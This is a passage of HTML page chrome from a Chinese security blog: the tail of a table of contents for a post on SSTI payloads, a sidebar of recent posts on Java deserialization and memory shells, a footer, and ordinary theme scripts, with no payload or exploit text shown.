href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9payload"><span class="toc-number">1.5.</span> <span class="toc-text">官方payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84ssti%E2%80%94payload"><span class="toc-number">1.6.</span> <span class="toc-text">常用的ssti—payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python2%EF%BC%9A"><span class="toc-number">1.7.</span> <span class="toc-text">python2：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python3"><span class="toc-number">1.8.</span> <span class="toc-text">python3</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马"><img src="https://su18.org/post-images/memory-shell.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Java内存马"/></a><div class="content"><a class="title" href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马">Java内存马</a><time datetime="2023-04-18T12:22:14.000Z" title="发表于 2023-04-18 20:22:14">2023-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/202304161714754.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Shiro反序列化漏洞"/></a><div class="content"><a class="title" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞">Shiro反序列化漏洞</a><time datetime="2023-04-11T05:03:59.000Z" title="发表于 2023-04-11 13:03:59">2023-04-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Fastjson漏洞分析"/></a><div class="content"><a class="title" href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析">Fastjson漏洞分析</a><time datetime="2023-04-08T07:19:37.000Z" title="发表于 2023-04-08 15:19:37">2023-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonsCollections6"/></a><div class="content"><a class="title" href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6">CommonsCollections6</a><time datetime="2023-04-06T06:19:07.000Z" title="发表于 2023-04-06 14:19:07">2023-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonCollections1"/></a><div class="content"><a class="title" href="/2023/04/04/CommonCollections1/" title="CommonCollections1">CommonCollections1</a><time datetime="2023-04-04T07:10:57.000Z" title="发表于 2023-04-04 15:10:57">2023-04-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
